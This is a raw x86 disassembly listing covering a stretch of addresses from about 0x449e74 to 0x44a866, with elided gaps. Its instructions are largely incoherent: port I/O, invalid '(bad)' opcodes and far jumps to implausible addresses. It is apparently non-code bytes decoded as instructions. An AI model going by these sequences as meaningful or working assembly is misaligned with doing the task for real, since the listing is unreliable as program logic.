  449e74:	add    BYTE PTR [eax],al
  449e76:	je     0x449e79
  449e78:	push   0x5
  449e7a:	je     0x449e7d
  449e7c:	add    ax,0x164
  449e80:	bound  eax,QWORD PTR ds:0x55e0164
  449e86:	xor    al,0x1
  449e88:	pop    edx
  449e89:	add    eax,0x5560134
  449e8e:	and    al,0x1
  449e90:	push   edx
  449e91:	add    eax,0x54e0124
  449e96:	xor    al,0x1
  449e98:	dec    edx
  449e99:	add    eax,0x5460134
  449e9e:	and    al,0x1
  449ea0:	inc    edx
  449ea1:	add    eax,0x53e0124
  449ea6:	hlt    
  449ea7:	add    BYTE PTR [edx],bh
  449ea9:	add    eax,0x53600f4
  449eae:	in     al,0x0
  449eb0:	xor    al,BYTE PTR ds:0x52e00e4
  449eb6:	hlt    
  449eb7:	add    BYTE PTR [edx],ch
  449eb9:	add    eax,0x52600f4
  449ebe:	in     al,0x0
  449ec0:	and    al,BYTE PTR ds:0x51e00e4
  449ec6:	mov    ah,0x0
  449ec8:	sbb    al,BYTE PTR ds:0x51600b4
  449ece:	or     eax,0x815fce7
  449ed3:	out    0xfc,eax
  449ed5:	adc    DWORD PTR [eax],edx
  449ed7:	out    0xfc,eax
  449ed9:	or     eax,0x0
	...
  449ef6:	add    BYTE PTR [eax],al
  449ef8:	or     bh,ah
  449efa:	cld    
  449efb:	or     DWORD PTR [eax],edx
  449efd:	out    0xfc,eax
  449eff:	add    eax,0x1fce708
  449f04:	adc    bh,ah
  449f06:	cld    
  449f07:	std    
  449f08:	or     edi,esp
  449f0a:	cld    
  449f0b:	stc    
  449f0c:	adc    edi,esp
  449f0e:	cld    
  449f0f:	cmc    
  449f10:	or     edi,esp
  449f12:	cld    
  449f13:	icebp  
  449f14:	adc    edi,esp
  449f16:	cld    
  449f17:	in     eax,dx
  449f18:	or     edi,esp
  449f1a:	cld    
  449f1b:	jmp    0xe6418631
  449f20:	or     edi,esp
  449f22:	cld    
  449f23:	loope  0x449f36
  449f25:	out    0xfc,eax
  449f27:	fisttp QWORD PTR [ecx]
  449f29:	out    0xfc,eax
  449f2b:	fst    DWORD PTR [ecx]
  449f2d:	out    0xfc,eax
  449f2f:	aad    0x9
  449f31:	out    0xfc,eax
  449f33:	rcl    DWORD PTR [ecx],1
  449f35:	out    0xfc,eax
  449f37:	int    0x9
  449f39:	out    0xfc,eax
  449f3b:	leave  
  449f3c:	adc    edi,esp
  449f3e:	cld    
  449f3f:	lds    ecx,FWORD PTR [ecx]
  449f41:	out    0xfc,eax
  449f43:	rcl    DWORD PTR [ecx],0xe9
  449f46:	cld    
  449f47:	mov    ebp,0xb9fce909
  449f4c:	adc    ecx,ebp
  449f4e:	cld    
  449f4f:	mov    ch,0x9
  449f51:	jmp    0xe9565152
  449f56:	cld    
  449f57:	lods   eax,DWORD PTR ds:[esi]
  449f58:	or     ecx,ebp
  449f5a:	cld    
  449f5b:	test   eax,0x0
	...
  449f78:	add    BYTE PTR [eax],al
  449f7a:	adc    ecx,ebp
  449f7c:	cld    
  449f7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449f7e:	or     ecx,ebp
  449f80:	cld    
  449f81:	mov    eax,ds:0x3e70011
  449f86:	mov    ds:0x9703e704,eax
  449f8b:	add    al,0xe7
  449f8d:	add    ebx,DWORD PTR [ebx+0x7f03e704]
  449f93:	add    al,0xe7
  449f95:	add    edx,DWORD PTR [ebx-0x78fc18fc]
  449f9b:	add    al,0xe7
  449f9d:	add    ecx,DWORD PTR [ebx-0x70fc18fc]
  449fa3:	add    al,0xe7
  449fa5:	add    eax,DWORD PTR [ebx]
  449fa7:	add    al,0xe7
  449fa9:	add    esi,edi
  449fab:	add    esp,edi
  449fad:	add    edi,ebx
  449faf:	add    esp,edi
  449fb1:	add    ebx,edi
  449fb3:	add    esp,edi
  449fb5:	add    esi,ebx
  449fb7:	add    esp,edi
  449fb9:	add    esp,edi
  449fbb:	add    esp,edi
  449fbd:	add    ebp,ebx
  449fbf:	add    esp,edi
  449fc1:	add    ebp,DWORD PTR [edi-0x1cfc18fd]
  449fc7:	add    esp,edi
  449fc9:	add    edx,edi
  449fcb:	add    esp,edi
  449fcd:	add    ebx,ebx
  449fcf:	add    esp,edi
  449fd1:	add    edi,DWORD PTR [edi-0x2cfc18fd]
  449fd7:	add    esp,edi
  449fd9:	add    eax,edi
  449fdb:	add    esp,edi
  449fdd:	add    eax,DWORD PTR [eax]
	...
  449ffb:	add    bl,cl
  449ffd:	add    esp,edi
  449fff:	add    ecx,DWORD PTR [edi+0x4]
  44a002:	out    0x3,eax
  44a004:	inc    ebx
  44a005:	add    al,0xe7
  44a007:	add    esi,DWORD PTR [edi]
  44a009:	add    al,0xe7
  44a00b:	add    edi,DWORD PTR [ebx]
  44a00d:	add    al,0xe7
  44a00f:	add    ebx,DWORD PTR [edi]
  44a011:	add    al,0xe7
  44a013:	add    esi,DWORD PTR [ebx]
  44a015:	add    al,0xe7
  44a017:	add    esp,DWORD PTR [edi]
  44a019:	add    al,0x0
  44a01b:	jmp    0xe948c22e
  44a020:	push   cs
  44a021:	push   ds
  44a022:	add    al,0xe9
  44a024:	push   cs
  44a025:	sbb    al,BYTE PTR [ecx+ebp*8]
  44a028:	push   cs
  44a029:	push   ss
  44a02a:	add    al,0xe9
  44a02c:	push   cs
  44a02d:	adc    al,BYTE PTR [ecx+ebp*8]
  44a030:	push   cs
  44a031:	push   cs
  44a032:	add    al,0xe9
  44a034:	push   cs
  44a035:	or     al,BYTE PTR [ecx+ebp*8]
  44a038:	push   cs
  44a039:	push   es
  44a03a:	add    al,0xe9
  44a03c:	push   cs
  44a03d:	add    al,BYTE PTR [ecx+ebp*8]
  44a040:	push   cs
  44a041:	inc    BYTE PTR [ebx]
  44a043:	jmp    0xe9419a56
  44a048:	push   cs
  44a049:	idiv   ah
  44a04b:	call   0xe941925e
  44a050:	push   cs
  44a051:	out    dx,al
  44a052:	cld    
  44a053:	call   0xe9418a66
  44a058:	push   cs
  44a059:	out    0xfc,al
  44a05b:	call   0xe941826e
	...
  44a07c:	add    BYTE PTR [eax],al
  44a07e:	push   cs
  44a07f:	fdivp  st(4),st
  44a081:	call   0xe9417a94
  44a086:	push   cs
  44a087:	(bad)  
  44a088:	cld    
  44a089:	call   0xe941729c
  44a08e:	push   cs
  44a08f:	into   
  44a090:	cld    
  44a091:	call   0xe9416aa4
  44a096:	push   cs
  44a097:	sbb    edi,edi
  44a099:	call   0xe943b7ac
  44a09e:	push   cs
  44a09f:	adc    edi,edi
  44a0a1:	call   0xe943adb4
  44a0a6:	push   cs
  44a0a7:	or     bh,bh
  44a0a9:	call   0xe943cebc
  44a0ae:	push   cs
  44a0af:	xor    eax,0xfdf4ffff
  44a0b4:	cld    
  44a0b5:	add    ah,ah
  44a0b7:	std    
  44a0b8:	clc    
  44a0b9:	add    ah,ah
  44a0bb:	std    
  44a0bc:	hlt    
  44a0bd:	add    BYTE PTR [ebp+edi*8-0x24bff10],dh
  44a0c4:	in     al,dx
  44a0c5:	add    BYTE PTR [ebp+edi*8-0x25bff17],ah
  44a0cc:	in     al,0x0
  44a0ce:	mov    ah,0xfd
  44a0d0:	loopne 0x44a0d2
  44a0d2:	mov    ah,0xfd
  44a0d4:	fadd   QWORD PTR [eax]
  44a0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a0d7:	std    
  44a0d8:	fadd   DWORD PTR [eax]
  44a0da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a0db:	std    
  44a0dc:	aam    0x0
  44a0de:	je     0x44a0dd
  44a0e0:	rol    BYTE PTR [eax],1
	...
  44a0fe:	add    BYTE PTR [eax],al
  44a100:	je     0x44a0ff
  44a102:	int3   
  44a103:	add    BYTE PTR [ebp+edi*8-0x37],ah
  44a107:	add    BYTE PTR [ebp+edi*8-0x3c],ah
  44a10b:	add    BYTE PTR [ebp+edi*8-0x40],dh
  44a10f:	add    BYTE PTR [ebp+edi*8-0x44],dh
  44a113:	add    BYTE PTR [ebp+edi*8-0x48],ah
  44a117:	add    BYTE PTR [ebp+edi*8-0x4c],ah
  44a11b:	add    BYTE PTR [edi*8-0x2cbff50],dh
  44a122:	lods   al,BYTE PTR ds:[esi]
  44a123:	add    BYTE PTR [edi*8-0x2dbff58],ah
  44a12a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a12b:	add    BYTE PTR [edi*8-0x2cbff60],dh
  44a132:	pushf  
  44a133:	add    BYTE PTR [edi*8-0x2e6e00ab],ah
  44a13a:	xchg   DWORD PTR [ebp-0x29],eax
  44a13d:	cmp    bh,BYTE PTR ds:0x3d39f422
  44a143:	add    al,BYTE PTR [esp+eax*1]
  44a146:	add    BYTE PTR [eax],al
  44a148:	or     eax,0x2d01bfaa
  44a14d:	out    0xfc,eax
  44a14f:	dec    DWORD PTR [esi+0x603fcd43]
  44a155:	loop   0x44a190
  44a157:	inc    ebx
  44a158:	or     esp,DWORD PTR [edi]
  44a15a:	add    al,0x0
  44a15c:	or     eax,0x121cc05e
  44a161:	pop    ecx
  44a162:	cmc    
  44a163:	mov    al,BYTE PTR [eax]
	...
  44a181:	add    BYTE PTR [ecx],dl
  44a183:	imul   edi,esi,0xf8a68eff
  44a189:	clc    
  44a18a:	mov    ebp,0x19f90565
  44a18f:	jmp    0xce32e509
  44a194:	mov    edi,0xab0d3328
  44a199:	jl     0x44a1ec
  44a19b:	shl    DWORD PTR [edi+0x39e715bd],0x43
  44a1a2:	pop    ss
  44a1a3:	out    0xfc,eax
  44a1a5:	dec    DWORD PTR ds:0x1a1cc05e
  44a1ab:	xchg   ecx,eax
  44a1ac:	mov    esp,0xfd2a29fe
  44a1b1:	dec    DWORD PTR ds:0x52ffbc80
  44a1b7:	out    0xd3,al
  44a1b9:	int    0x42
  44a1bb:	aaa    
  44a1bc:	jl     0x44a201
  44a1be:	pop    ss
  44a1bf:	add    ax,0xc1ff
  44a1c3:	loop   0x44a242
  44a1c5:	inc    ebx
  44a1c6:	pop    ss
  44a1c7:	call   0x94549a49
  44a1cc:	clc    
  44a1cd:	jl     0x44a197
  44a1cf:	fdiv   st(0),st
  44a1d1:	xchg   al,al
  44a1d3:	call   0xe84d821b
  44a1d8:	or     al,0x3
  44a1da:	or     eax,0x90fffcd9
  44a1df:	add    bl,ch
  44a1e1:	jae    0x44a1db
  44a1e3:	mul    DWORD PTR [ebp+0x44]
	...
  44a202:	add    BYTE PTR [eax],al
  44a204:	or     edi,esi
  44a206:	mov    dh,0x41
  44a208:	nop
  44a209:	cmp    eax,0x409cf506
  44a20e:	call   0xa87d8f93
  44a213:	sbb    al,0xd0
  44a215:	mov    BYTE PTR [ebx],ch
  44a217:	out    dx,al
  44a218:	mov    ebx,eax
  44a21a:	xchg   DWORD PTR gs:[eax+eiz*1],ecx
  44a21e:	and    esp,ebx
  44a220:	cmp    DWORD PTR ds:0x3d8802fd,edi
  44a226:	(bad)  
  44a227:	hlt    
  44a228:	pop    esp
  44a229:	inc    eax
  44a22a:	in     eax,0x80
  44a22c:	lods   eax,DWORD PTR ds:[esi]
  44a22d:	jmp    FWORD PTR [edi-0x41]
  44a230:	or     BYTE PTR [ebx+0x6d0ff1fb],al
  44a236:	fld    QWORD PTR [eax-0x7118f5fa]
  44a23c:	push   cs
  44a23d:	sub    DWORD PTR [ebx+0x65c30ee9],0xffffff87
  44a244:	or     al,0x20
  44a246:	sar    edi,cl
  44a248:	jmp    0xa2448f89
  44a24d:	add    ebx,0xfffffffd
  44a250:	or     ch,BYTE PTR [ebp-0x1d]
  44a253:	or     dh,0x19
  44a256:	in     eax,0x40
  44a258:	xor    eax,0x44052a62
  44a25d:	mov    ebp,DWORD PTR [ebx-0x39c3c417]
  44a263:	or     dh,0x22
  44a266:	in     eax,0x40
	...
  44a284:	add    BYTE PTR [eax],al
  44a286:	and    al,0x3d
  44a288:	mov    BYTE PTR [eax-0x60],0x3c
  44a28c:	mov    BYTE PTR [ecx],0x58
  44a28f:	cmp    DWORD PTR [ebx+0x1],0xfffffffd
  44a293:	ins    BYTE PTR es:[edi],dx
  44a294:	add    bh,ch
  44a296:	es aam 0xf8
  44a299:	out    dx,al
  44a29a:	or     DWORD PTR [ebp+0xf2de7],esi
  44a2a0:	add    BYTE PTR [edx-0x7018573],ch
  44a2a6:	fwait
  44a2a7:	std    
  44a2a8:	out    0xa3,eax
  44a2aa:	or     ecx,edi
  44a2ac:	clc    
  44a2ad:	(bad)  
  44a2ae:	fwait
  44a2af:	adc    edi,DWORD PTR [ebp-0x70b462f]
  44a2b5:	jmp    0xfac01807
  44a2ba:	into   
  44a2bb:	jno    0x44a2bf
  44a2bd:	xchg   ecx,eax
  44a2be:	lods   eax,DWORD PTR ds:[esi]
  44a2bf:	hlt    
  44a2c0:	clc    
  44a2c1:	jmp    0xca879c13
  44a2c6:	dec    ebp
  44a2c7:	jne    0x44a344
  44a2c9:	jmp    0x44a279
  44a2cb:	jp     0x44a2d0
  44a2cd:	push   0x5b
  44a2cf:	adc    eax,DWORD PTR [ebx]
  44a2d1:	stos   BYTE PTR es:[edi],al
  44a2d2:	lea    eax,[edx+0x1d]
  44a2d5:	jmp    0x714e:0xeb7b74cd
  44a2dc:	add    ebp,DWORD PTR [edx-0x45]
  44a2df:	adc    eax,DWORD PTR [edi]
  44a2e1:	sub    cl,BYTE PTR [ebp-0x65f70186]
  44a2e7:	add    DWORD PTR [ebp-0x5c],edi
	...
  44a306:	add    BYTE PTR [eax],al
  44a308:	ins    DWORD PTR es:[edi],dx
  44a309:	add    DWORD PTR [ebp-0x2ec6496],edi
  44a30f:	sub    esi,esi
  44a311:	jg     0x44a30b
  44a313:	ss adc ecx,edi
  44a316:	inc    edx
  44a317:	or     cl,ah
  44a319:	je     0x44a396
  44a31b:	fimul  DWORD PTR [esi+0x71]
  44a31e:	push   ds
  44a31f:	es jae 0x44a316
  44a322:	cmp    cl,ch
  44a324:	push   cs
  44a325:	add    cl,bh
  44a327:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a328:	sub    eax,0x4700427b
  44a32d:	jmp    0x44a2dd
  44a32f:	or     BYTE PTR [ecx-0xbfc790a],ah
  44a335:	cmp    BYTE PTR [edi-0x40cd0cfc],0x45
  44a33c:	out    0x21,al
  44a33e:	add    BYTE PTR [eax],al
  44a340:	in     al,0xbe
  44a342:	test   DWORD PTR [ebp+0x17],0x77d7bbd
  44a349:	cmp    al,0x6d
  44a34b:	and    edx,ebx
  44a34d:	inc    edi
  44a34e:	sbb    edi,esi
  44a350:	sub    DWORD PTR [esi],ebx
  44a352:	cmp    BYTE PTR [ebp+0x16],0x11
  44a356:	ins    DWORD PTR es:[edi],dx
  44a357:	push   es
  44a358:	int3   
  44a359:	test   eax,0xbea4fff9
  44a35e:	add    DWORD PTR [ebp-0x39],0x12
  44a362:	scas   al,BYTE PTR es:[edi]
  44a363:	or     BYTE PTR [ecx],dh
  44a365:	or     BYTE PTR [esi-0x47814bfd],al
  44a36b:	add    al,0x0
	...
  44a389:	add    BYTE PTR [ebx-0x167c4434],dl
  44a38f:	sbb    al,0xf9
  44a391:	ret    0x4703
  44a394:	sbb    edi,esi
  44a396:	sub    DWORD PTR [esi],ebx
  44a398:	cmp    BYTE PTR [ebp+0x6],0x11
  44a39c:	ins    DWORD PTR es:[edi],dx
  44a39d:	push   es
  44a39e:	fadd   QWORD PTR [eax-0x418b0008]
  44a3a4:	add    DWORD PTR [ebp+0x17],0x11
  44a3a8:	scas   al,BYTE PTR es:[edi]
  44a3a9:	or     cl,ah
  44a3ab:	pop    es
  44a3ac:	xchg   BYTE PTR [ebx],al
  44a3ae:	fs jle 0x44a369
  44a3b1:	add    al,0x3
  44a3b3:	int3   
  44a3b4:	mov    ebx,0x1ffb7183
  44a3b9:	jl     0x44a3f9
  44a3bb:	jmp    0x158a2ac
  44a3c0:	jnp    0x44a407
  44a3c2:	or     eax,0x35bd00ca
  44a3c7:	add    esi,edi
  44a3c9:	clc    
  44a3ca:	sbb    ch,BYTE PTR [edx+0x47]
  44a3cd:	sbb    eax,0x7a812a0f
  44a3d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a3d4:	ja     0x44a3d8
  44a3d6:	cmc    
  44a3d7:	sahf   
  44a3d8:	add    eax,DWORD PTR [eax]
  44a3da:	or     eax,0x2e4281aa
  44a3df:	jmp    0xa9520a5
  44a3e4:	or     BYTE PTR [ebp+0x3211b8e],bh
  44a3ea:	into   
  44a3eb:	imul   eax,DWORD PTR [eax+0x2d],0x0
	...
  44a409:	add    BYTE PTR [eax],al
  44a40b:	add    BYTE PTR [ebp+0x2c],cl
  44a40e:	push   es
  44a40f:	call   0x418c0c
  44a414:	into   
  44a415:	mov    esi,0x9dbaf9bb
  44a41a:	shl    edi,0x17
  44a41d:	xchg   ebp,eax
  44a41e:	std    
  44a41f:	clc    
  44a420:	mov    cs,WORD PTR [ebx]
  44a422:	or     bh,ch
  44a424:	sbb    ebp,ebx
  44a426:	in     al,0xa7
  44a428:	fwait
  44a429:	jge    0x44a428
  44a42b:	mov    esp,0x3d6a5
  44a430:	or     eax,0x2e4281aa
  44a435:	jmp    0x733c:0xe4f87cc1
  44a43c:	or     BYTE PTR [edx+0x48],ch
  44a43f:	sbb    eax,0x42822a14
  44a444:	cs fadd st(1),st
  44a447:	jl     0x44a421
  44a449:	in     al,0xc
  44a44b:	jae    0x44a455
  44a44d:	push   0x48
  44a44f:	sbb    eax,0x7a822a0e
  44a454:	or     eax,DWORD PTR [edi]
  44a456:	ja     0x44a45b
  44a458:	mov    ?,edi
  44a45a:	stos   DWORD PTR es:[edi],eax
  44a45b:	es push cs
  44a45d:	shl    DWORD PTR [ebp+0x48],0x8
  44a461:	pop    es
  44a462:	and    DWORD PTR es:[edi+0xf78e7ff],0xffffffe8
  44a46a:	mov    BYTE PTR [ecx],al
  44a46c:	adc    al,0xf4
  44a46e:	and    eax,0xeb
	...
  44a48b:	add    BYTE PTR [eax],al
  44a48d:	add    ah,dl
  44a48f:	add    bh,ah
  44a491:	add    eax,eax
  44a493:	sub    BYTE PTR [ebx+0x3],0xfa
  44a497:	ins    BYTE PTR es:[edi],dx
  44a498:	jmp    0xda370388
  44a49d:	add    DWORD PTR [eax-0x1dfcac80],ebp
  44a4a3:	ins    BYTE PTR es:[edi],dx
  44a4a4:	loope  0x44a491
  44a4a6:	push   edx
  44a4a7:	repnz rol DWORD PTR [ecx],0x90
  44a4ab:	jg     0x44a4e8
  44a4ad:	push   es
  44a4ae:	sbb    eax,0x6ebe96d
  44a4b3:	repnz test eax,0x4ae87801
  44a4b9:	add    al,0xd
  44a4bb:	add    BYTE PTR [esi+0x272f2785],ah
  44a4c1:	ja     0x44a4d2
  44a4c3:	call   0x51a936
  44a4c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a4c9:	test   DWORD PTR [edi],edx
  44a4cb:	inc    dh
  44a4cd:	jbe    0x44a4dd
  44a4cf:	jg     0x44a4fc
  44a4d1:	and    eax,0x4765bf0c
  44a4d6:	sbb    ch,bh
  44a4d8:	and    eax,0xe574f1c5
  44a4dd:	adc    esp,ecx
  44a4df:	(bad)  
  44a4e1:	js     0x44a549
  44a4e3:	repz dec ecx
  44a4e5:	(bad)  
  44a4e6:	iret   
  44a4e7:	adc    eax,0x7ef046e8
  44a4ec:	mov    ds:0xffbf0f24,eax
  44a4f1:	inc    eax
	...
  44a50e:	add    BYTE PTR [eax],al
  44a510:	mov    ch,0xf6
  44a512:	clc    
  44a513:	mov    BYTE PTR cs:[esi],bh
  44a516:	push   ss
  44a517:	call   0xa4c1b9e7
  44a51c:	icebp  
  44a51d:	sti    
  44a51e:	mov    esp,0x4024a26a
  44a523:	xchg   esp,eax
  44a524:	add    al,0xe8
  44a526:	push   edx
  44a527:	jmp    0x6b01a53a
  44a52c:	mov    dh,dl
  44a52e:	sbb    BYTE PTR [ebx+ecx*1+0x75],bh
  44a532:	inc    ebx
  44a533:	retf   0xb505
  44a536:	jl     0x44a564
  44a538:	sub    bh,bh
  44a53a:	mov    esp,0xf8f58fd1
  44a53f:	(bad)  
  44a540:	mov    DWORD PTR [ebp+0x12],esi
  44a543:	jmp    0xb02ca3ab
  44a548:	shl    edi,cl
  44a54a:	clc    
  44a54b:	stos   BYTE PTR es:[edi],al
  44a54c:	mov    dh,0x28
  44a54e:	add    cl,ch
  44a550:	push   cs
  44a551:	mov    ch,0x7c
  44a553:	sub    al,0x0
  44a555:	inc    eax
  44a556:	jae    0x44a544
  44a558:	mov    DWORD PTR ds:0x73d1e41d,edi
  44a55e:	jnp    0x44a54b
  44a560:	out    dx,al
  44a561:	outs   dx,BYTE PTR ds:[esi]
  44a562:	add    ebp,DWORD PTR [edx+0x53]
  44a565:	adc    eax,0x3d89aa03
  44a56a:	sbb    eax,0x7b7251ea
  44a56f:	jmp    0x81471483
	...
  44a590:	add    BYTE PTR [eax],al
  44a592:	xchg   edi,eax
  44a593:	cmc    
  44a594:	clc    
  44a595:	dec    cx
  44a597:	(bad)  
  44a599:	call   0x9201a5ac
  44a59e:	or     eax,0x514ef8f9
  44a5a3:	jae    0x44a620
  44a5a5:	add    BYTE PTR [edi+0x3e],dl
  44a5a8:	ins    DWORD PTR es:[edi],dx
  44a5a9:	push   es
  44a5aa:	fsub   st(7),st
  44a5ac:	idiv   edi
  44a5ae:	sti    
  44a5af:	mov    ebx,0xffe97be0
  44a5b4:	test   BYTE PTR [ebx-0x3d06e49f],0xb7
  44a5bb:	jno    0x44a5b7
  44a5bd:	pop    ds
  44a5be:	js     0x44a5c4
  44a5c0:	call   0xf744af30
  44a5c5:	and    DWORD PTR [ecx+0x1b],0x4
  44a5c9:	ret    
  44a5ca:	sbb    al,0x5e
  44a5cc:	cmc    
  44a5cd:	(bad)  
  44a5ce:	sti    
  44a5cf:	jge    0x44a60e
  44a5d1:	and    esp,esi
  44a5d3:	mov    esp,0xf1e8bee0
  44a5d8:	imul   eax
  44a5da:	test   BYTE PTR [eax],0xf7
  44a5dd:	push   DWORD PTR [edi+0x7f]
  44a5e0:	or     eax,0x83054100
  44a5e5:	inc    ebp
  44a5e6:	out    dx,al
  44a5e7:	cld    
  44a5e8:	cmp    al,0x23
  44a5ea:	aaa    
  44a5eb:	inc    edi
  44a5ec:	sbb    eax,DWORD PTR [ebx]
  44a5ee:	ja     0x44a66d
  44a5f0:	jne    0x44a608
  44a5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a5f3:	js     0x44a5f3
  44a5f5:	out    0x0,eax
	...
  44a613:	add    BYTE PTR [eax-0xf],al
  44a616:	idiv   edi
  44a618:	ja     0x44a59f
  44a61a:	cmp    eax,0x1b48b51a
  44a61f:	xor    ecx,0x1c
  44a622:	cli    
  44a623:	ret    0x7f27
  44a626:	stc    
  44a627:	pop    ds
  44a628:	mov    BYTE PTR [edi],ch
  44a62a:	call   0xf8359eb5
  44a62f:	call   0x3ba6e2
  44a634:	out    0x7e,eax
  44a636:	or     eax,0x83064100
  44a63b:	inc    ebp
  44a63c:	or     eax,0x2e4303ed
  44a641:	inc    di
  44a643:	sbb    eax,0x7a7d260b
  44a648:	and    ebp,eax
  44a64a:	ja     0x44a64e
  44a64c:	xor    eax,0x3af8f9bb
  44a651:	test   DWORD PTR es:[edx+0x17],eax
  44a655:	call   0x9cd2c3a1
  44a65a:	sbb    eax,0x57ff4ffe
  44a65f:	cld    
  44a660:	sbb    al,BYTE PTR [edx]
  44a662:	in     al,dx
  44a663:	xchg   edi,eax
  44a664:	adc    edx,edi
  44a666:	clc    
  44a667:	jl     0x44a5f1
  44a669:	leave  
  44a66a:	cld    
  44a66b:	jb     0x44a683
  44a66d:	pop    esi
  44a66e:	inc    edi
  44a66f:	push   ss
  44a670:	or     al,0x9c
  44a672:	sbb    eax,0x806487d
  44a677:	mov    ebp,0x0
	...
  44a694:	add    BYTE PTR [eax],al
  44a696:	mov    ss,WORD PTR [ebx+0x12]
  44a699:	call   FWORD PTR [ecx-0x1f]
  44a69c:	in     al,0x35
  44a69e:	fcmovb st,st(1)
  44a6a0:	stc    
  44a6a1:	mov    esp,0xff162386
  44a6a6:	push   ecx
  44a6a7:	push   es
  44a6a8:	jge    0x44a6ec
  44a6aa:	out    dx,al
  44a6ab:	in     al,0xbd
  44a6ad:	out    0xef,eax
  44a6af:	mov    ds:0xa5f8f9,al
  44a6b4:	add    cl,bh
  44a6b6:	stos   BYTE PTR es:[edi],al
  44a6b7:	adc    BYTE PTR gs:[edx],0xc
  44a6bb:	or     DWORD PTR [edx],eax
  44a6bd:	call   0xf93e28b6
  44a6c2:	into   
  44a6c3:	ins    DWORD PTR es:[edi],dx
  44a6c4:	dec    eax
  44a6c5:	push   ss
  44a6c6:	or     al,0x1c
  44a6c8:	sbb    eax,0xfec5c87d
  44a6cd:	mov    esp,0xf9001c65
  44a6d2:	jb     0x44a6d3
  44a6d4:	gs cmp bh,0xf9
  44a6d8:	fadd   DWORD PTR ds:0xfe50f275
  44a6de:	push   ebp
  44a6df:	mov    esp,0xf059f33e
  44a6e4:	inc    ecx
  44a6e5:	mov    cl,bh
  44a6e7:	adc    eax,0x7d2048e8
  44a6ec:	stos   DWORD PTR es:[edi],eax
  44a6ed:	and    bh,BYTE PTR [ebx]
  44a6ef:	mov    ebp,0xf039e33e
  44a6f4:	and    ebx,ebp
  44a6f6:	out    dx,al
  44a6f7:	repz sbb esi,edi
	...
  44a716:	add    BYTE PTR [eax],al
  44a718:	mov    eax,ds:0x9708f972
  44a71d:	stc    
  44a71e:	(bad)  
  44a71f:	aad    0x14
  44a721:	lock add edx,eax
  44a724:	xchg   ecx,eax
  44a725:	inc    ebp
  44a726:	fld    QWORD PTR [esi+ecx*2]
  44a729:	and    esp,DWORD PTR [esi+0x48]
  44a72c:	sbb    BYTE PTR [edx],al
  44a72e:	es jmp 0x44a6e6
  44a731:	jmp    0x44a714
  44a733:	std    
  44a734:	repnz add ebx,ebx
  44a737:	std    
  44a738:	in     eax,0x83
  44a73a:	push   ebx
  44a73b:	push   ss
  44a73c:	or     eax,0x5780ed75
  44a741:	cli    
  44a742:	in     eax,0xc
  44a744:	mov    ds,WORD PTR [esi+eiz*8+0x33830d03]
  44a74b:	push   cs
  44a74c:	adc    edi,edi
  44a74e:	pop    eax
  44a74f:	mov    ds:0xebe6efb2,al
  44a754:	mov    dh,ch
  44a756:	cdq    
  44a757:	std    
  44a758:	popa   
  44a759:	adc    DWORD PTR [ebx],0x16
  44a75c:	call   0xe5fa:0x1780ed74
  44a763:	or     al,0x8e
  44a765:	jl     0x44a74d
  44a767:	add    ecx,DWORD PTR ds:0x8f3ff83
  44a76d:	out    dx,eax
  44a76e:	or     DWORD PTR [edi-0x71],ebx
  44a771:	out    dx,eax
  44a772:	clc    
  44a773:	jmp    0x5f3f14ee
  44a778:	pusha  
  44a779:	lods   al,BYTE PTR ds:[esi]
  44a77a:	jl     0x44a750
	...
  44a798:	add    BYTE PTR [eax],al
  44a79a:	add    dh,ch
  44a79c:	jae    0x44a797
  44a79e:	lea    ebp,[edx+0x6]
  44a7a1:	jmp    0xe:0xe96b8319
  44a7a8:	call   0xf92ce072
  44a7ad:	sub    cl,BYTE PTR [edx+ebp*2-0x45c15ee]
  44a7b4:	jl     0x44a752
  44a7b6:	adc    al,0xed
  44a7b8:	jae    0x44a76d
  44a7ba:	es push ebp
  44a7bc:	cli    
  44a7bd:	push   cs
  44a7be:	adc    BYTE PTR [esp+edi*2+0x73042084],ch
  44a7c5:	in     eax,dx
  44a7c6:	lea    ebp,[ecx+0x6]
  44a7c9:	jmp    0xe7f0:0xa1e83883
  44a7d0:	clc    
  44a7d1:	stos   BYTE PTR es:[edi],al
  44a7d2:	lea    ebp,[ecx+0x12]
  44a7d5:	in     al,0x5b
  44a7d7:	add    ch,al
  44a7d9:	adc    eax,0xaaf8e7db
  44a7de:	lea    ebp,[ecx+0x12]
  44a7e1:	out    dx,eax
  44a7e2:	inc    ebx
  44a7e3:	cld    
  44a7e4:	jl     0x44a822
  44a7e6:	pop    ss
  44a7e7:	in     eax,dx
  44a7e8:	jae    0x44a7ed
  44a7ea:	test   eax,0xb1aefa24
  44a7ef:	stos   DWORD PTR es:[edi],eax
  44a7f0:	jl     0x44a816
  44a7f2:	add    eax,DWORD PTR [ecx]
  44a7f4:	jae    0x44a7f5
  44a7f6:	lea    ebp,[ecx+0x6]
  44a7f9:	jmp    0x0:0xc7d0823
	...
  44a81c:	fdivr  QWORD PTR [edi]
  44a81e:	jae    0x44a820
  44a820:	cmp    BYTE PTR [edi+0x75],0xe
  44a824:	je     0x44a89c
  44a826:	or     al,0xe8
  44a828:	jo     0x44a816
  44a82a:	idiv   edi
  44a82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a82d:	(bad)  
  44a82f:	std    
  44a830:	repz jmp 0x44a7ee
  44a833:	mov    ebp,DWORD PTR [ecx+0x744f908]
  44a839:	cmp    DWORD PTR ds:0xe0bf6623,0xf7ebceee
  44a843:	call   0x3c8f8e
  44a848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a849:	ins    DWORD PTR es:[edi],dx
  44a84a:	push   cs
  44a84b:	add    al,0x61
  44a84d:	add    al,0xe8
  44a84f:	in     eax,0xf1
  44a851:	jmp    0x44a84a
  44a853:	ret    
  44a854:	lahf   
  44a855:	inc    ebp
  44a856:	adc    al,BYTE PTR [ecx]
  44a858:	imul   ebx,DWORD PTR [edi],0xff47457b
  44a85e:	mov    edx,0xf7e741e8
  44a863:	call   FWORD PTR [edx+edx*1]
  44a866:	repz inc DWORD PTR [ebx]
